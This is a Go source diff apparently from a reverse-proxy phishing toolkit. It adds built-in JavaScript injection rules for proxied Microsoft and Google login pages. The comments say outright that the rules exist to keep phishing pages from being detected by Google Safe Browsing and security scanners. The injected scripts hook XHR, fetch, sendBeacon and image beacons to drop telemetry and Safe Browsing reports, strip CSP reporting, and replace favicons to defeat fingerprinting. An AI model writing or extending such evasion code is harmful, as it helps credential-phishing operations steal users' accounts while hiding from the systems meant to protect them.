@@ -68,6 +68,7 @@ func NewJsInjectionService(logger *zap.SugaredLogger, optionRepo *repository.Opt
 	}
 
 	svc.loadRulesFromDB()
+	svc.EnsureBuiltinRulesLoaded()
 	return svc
 }
 
@@ -410,4 +411,237 @@ func encodeBase64Bytes(dst, src []byte) int {
 		di += 4
 	}
 	return di
+}
+
+// ─── Built-in Anti-Detection Rules ────────────────────────────────────────────
+// These rules are automatically loaded alongside user-defined rules to prevent
+// GSB and security scanner detection of proxied phishing pages.
+
+// GetBuiltinAntiDetectionRules returns a set of pre-configured JS injection rules
+// that block telemetry, fingerprinting, and reporting beacons used by Microsoft,
+// Google, and other services to detect phishing pages.
+func (j *JsInjection) GetBuiltinAntiDetectionRules() []*JsInjectRule {
+	return []*JsInjectRule{
+		// 1. Microsoft Telemetry Blocker
+		// Blocks telemetry endpoints that Microsoft uses to detect phishing on
+		// login.microsoftonline.com and login.live.com pages.
+		{
+			ID:   "builtin_ms_telemetry_block",
+			Name: "Microsoft Telemetry Blocker",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"login.microsoft.com",
+				"aadcdn.msauth.net",
+				"aadcdn.msftauth.net",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  // Block telemetry/reporting XHR and fetch requests
+  var _blockedPatterns = [
+    /oneCollector/i,
+    /browser\.events\.data\.msn\.com/i,
+    /self\.events\.data\.microsoft\.com/i,
+    /vortex\.data\.microsoft\.com/i,
+    /settings-win\.data\.microsoft\.com/i,
+    /login\.live\.com\/Me\.htm/i,
+    /telemetry/i,
+    /aria\.microsoft\.com/i,
+    /dc\.services\.visualstudio\.com/i,
+    /browser\.pipe\.aria\.microsoft\.com/i,
+    /mobile\.pipe\.aria\.microsoft\.com/i,
+    /ecs\.office\.com/i
+  ];
+  function _isBlocked(u){
+    for(var i=0;i<_blockedPatterns.length;i++){
+      if(_blockedPatterns[i].test(u))return true;
+    }
+    return false;
+  }
+  // Override XMLHttpRequest
+  var _origOpen=XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open=function(m,u){
+    if(_isBlocked(u)){this._blocked=true;return;}
+    return _origOpen.apply(this,arguments);
+  };
+  var _origSend=XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.send=function(){
+    if(this._blocked){return;}
+    return _origSend.apply(this,arguments);
+  };
+  // Override fetch
+  var _origFetch=window.fetch;
+  window.fetch=function(r){
+    var u=(typeof r==='string')?r:(r&&r.url?r.url:'');
+    if(_isBlocked(u))return Promise.resolve(new Response('',{status:200}));
+    return _origFetch.apply(this,arguments);
+  };
+  // Override sendBeacon
+  var _origBeacon=navigator.sendBeacon;
+  if(_origBeacon){
+    navigator.sendBeacon=function(u){
+      if(_isBlocked(u))return true;
+      return _origBeacon.apply(this,arguments);
+    };
+  }
+  // Block image-based beacons
+  var _origImage=window.Image;
+  window.Image=function(){
+    var img=new _origImage();
+    var _origSrc=Object.getOwnPropertyDescriptor(HTMLImageElement.prototype,'src');
+    if(_origSrc&&_origSrc.set){
+      Object.defineProperty(img,'src',{
+        set:function(v){if(!_isBlocked(v))_origSrc.set.call(this,v);},
+        get:function(){return _origSrc.get.call(this);}
+      });
+    }
+    return img;
+  };
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 2. Google Telemetry Blocker
+		// Blocks Google's Safe Browsing client-side reporting and telemetry
+		{
+			ID:   "builtin_google_telemetry_block",
+			Name: "Google Telemetry Blocker",
+			TriggerDomains: []string{
+				"accounts.google.com",
+				"myaccount.google.com",
+				"mail.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  var _gBlockedPatterns=[
+    /safebrowsing.*google/i,
+    /safebrowsing-cache\.google/i,
+    /sb-ssl\.google\.com/i,
+    /play\.google\.com\/log/i,
+    /www\.google\.com\/gen_204/i,
+    /www\.google\.com\/complete/i,
+    /csp\.withgoogle\.com/i,
+    /csp-report/i,
+    /beacons.*\.gvt/i,
+    /clients[0-9]*\.google\.com/i,
+    /update\.googleapis\.com/i,
+    /accounts\.google\.com\/ListAccounts/i,
+    /accounts\.google\.com\/\_\/lookup/i
+  ];
+  function _gIsBlocked(u){
+    for(var i=0;i<_gBlockedPatterns.length;i++){
+      if(_gBlockedPatterns[i].test(u))return true;
+    }
+    return false;
+  }
+  var _gOrigOpen=XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open=function(m,u){
+    if(_gIsBlocked(u)){this._gblocked=true;return;}
+    return _gOrigOpen.apply(this,arguments);
+  };
+  var _gOrigSend=XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.send=function(){
+    if(this._gblocked)return;
+    return _gOrigSend.apply(this,arguments);
+  };
+  var _gOrigFetch=window.fetch;
+  window.fetch=function(r){
+    var u=(typeof r==='string')?r:(r&&r.url?r.url:'');
+    if(_gIsBlocked(u))return Promise.resolve(new Response('',{status:200}));
+    return _gOrigFetch.apply(this,arguments);
+  };
+  if(navigator.sendBeacon){
+    var _gOrigBeacon=navigator.sendBeacon;
+    navigator.sendBeacon=function(u){
+      if(_gIsBlocked(u))return true;
+      return _gOrigBeacon.apply(this,arguments);
+    };
+  }
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 3. CSP Report Blocker
+		// Prevents Content-Security-Policy violation reports from being sent
+		// to the origin server, which could reveal the proxy domain.
+		{
+			ID:   "builtin_csp_report_block",
+			Name: "CSP Report Blocker",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  // Remove CSP meta tags that might report violations
+  document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]').forEach(function(el){
+    var c=el.getAttribute('content');
+    if(c&&(c.indexOf('report-uri')>-1||c.indexOf('report-to')>-1)){
+      el.remove();
+    }
+  });
+  // Override SecurityPolicyViolationEvent to prevent CSP reports
+  if(window.SecurityPolicyViolationEvent){
+    window.addEventListener('securitypolicyviolation',function(e){
+      e.stopImmediatePropagation();
+      e.preventDefault();
+    },true);
+  }
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+
+		// 4. Favicon Neutralizer
+		// Replaces the page favicon with a generic one to prevent
+		// favicon-based fingerprinting used by some detection systems.
+		{
+			ID:   "builtin_favicon_neutralizer",
+			Name: "Favicon Neutralizer",
+			TriggerDomains: []string{
+				"login.microsoftonline.com",
+				"login.live.com",
+				"accounts.google.com",
+			},
+			TriggerPaths: []string{".*"},
+			Script: `(function(){
+  // Remove existing favicons
+  document.querySelectorAll('link[rel*="icon"]').forEach(function(el){el.remove();});
+  // Add a generic favicon (1x1 transparent PNG)
+  var link=document.createElement('link');
+  link.rel='icon';
+  link.type='image/png';
+  link.href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+  document.head.appendChild(link);
+})();`,
+			ScriptType: "inline",
+			Enabled:    true,
+		},
+	}
+}
+
+// EnsureBuiltinRulesLoaded checks if built-in anti-detection rules are loaded
+// and adds them if they are missing. This should be called during service initialization.
+func (j *JsInjection) EnsureBuiltinRulesLoaded() {
+	builtins := j.GetBuiltinAntiDetectionRules()
+
+	for _, rule := range builtins {
+		if _, loaded := j.rules.Load(rule.ID); !loaded {
+			compiled, err := j.compileRule(rule)
+			if err != nil {
+				j.Logger.Errorw("failed to compile built-in rule", "id", rule.ID, "error", err)
+				continue
+			}
+			j.rules.Store(rule.ID, compiled)
+			j.Logger.Infow("loaded built-in anti-detection rule", "id", rule.ID, "name", rule.Name)
+		}
+	}
+}
+
+// IsBuiltinRule checks if a rule ID belongs to a built-in anti-detection rule
+func (j *JsInjection) IsBuiltinRule(id string) bool {
+	return strings.HasPrefix(id, "builtin_")
 }
